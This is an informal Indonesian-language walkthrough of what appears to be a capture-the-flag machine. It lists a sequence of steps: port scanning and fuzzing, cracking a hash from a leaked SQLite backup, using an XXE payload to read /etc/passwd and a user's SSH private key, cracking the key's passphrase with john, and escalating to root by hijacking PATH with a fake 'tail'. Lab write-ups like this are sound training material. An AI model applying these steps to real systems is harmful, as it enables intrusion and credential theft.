# boot:
1. scan nmap ada port 22 80 ama port login -> di port 80 fuzz aja nanti nemu path
2. di path ada file .bak download aja -> terus strings namafile -> soalnya itu binary sqlite gitu
3. dapet tuh admin ama hash -> decrypt disini: https://md5decrypt.net/en/Sha1/
4. dapet nanti creds nya coba login admin:hasil hash
5. kelar login ctrl u aja -> ada form xml -> ama catatan buat barry
6. cari payload xxe -> nanti test ke arah /etc/passwd dulu -> kalau udah ke /home/barry/.ssh/id_rsa kan disuruh tadi
7. chmod 600 rsa -> butuh passphrase ternyata -> ssh2john rsa > rsa.hash 
8. sudo john rsa.hash --wordlist=rockyou



# pe: 
1. echo $PATH -> cd /tmp -> echo "/bin/bash" > tail -> chmod 777 tail -> export PATH=/tmp:$PATH
2. ./ke live log yang di joe itu -> klaim root 
